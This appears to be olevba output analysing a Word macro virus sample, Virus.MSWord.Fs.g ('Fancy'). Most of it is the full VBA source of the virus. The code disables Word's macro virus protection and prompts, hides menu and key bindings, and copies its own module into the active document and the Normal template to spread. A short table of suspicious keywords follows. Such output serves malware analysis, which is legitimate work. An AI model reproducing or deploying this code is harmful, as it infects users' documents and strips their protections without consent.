olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fancy.bas 
in file: Virus.MSWord.Fs.g - OLE stream: 'Macros/VBA/Fancy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Fancy
Sub DocClose()
Const ι = "Fancy": On Error Resume Next
Options.VirusProtection = &H0
Options.SaveNormalPrompt = &H0
Options.ConfirmConversions = &H0
Application.EnableCancelKey = &H0
If ActiveDocument.Path = "" Then GoTo 0
CommandBars("Tools").Controls(12).Visible = &H0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8), KeyCategory:=0, Command:=" "
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
If Dir(Application.Path & ".SHS") = "" Then ThisDocument.VBProject.VBComponents(ι).Export Application.Path & ".SHS"
If ActiveDocument.VBProject.VBComponents(ι).Name <> ι Then ActiveDocument.VBProject.VBComponents.Import Application.Path & ".SHS"
If NormalTemplate.VBProject.VBComponents(ι).Name <> ι Then NormalTemplate.VBProject.VBComponents.Import Application.Path & ".SHS"
0 ActiveDocument.Close: End Sub
Sub FileClose(): DocClose: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

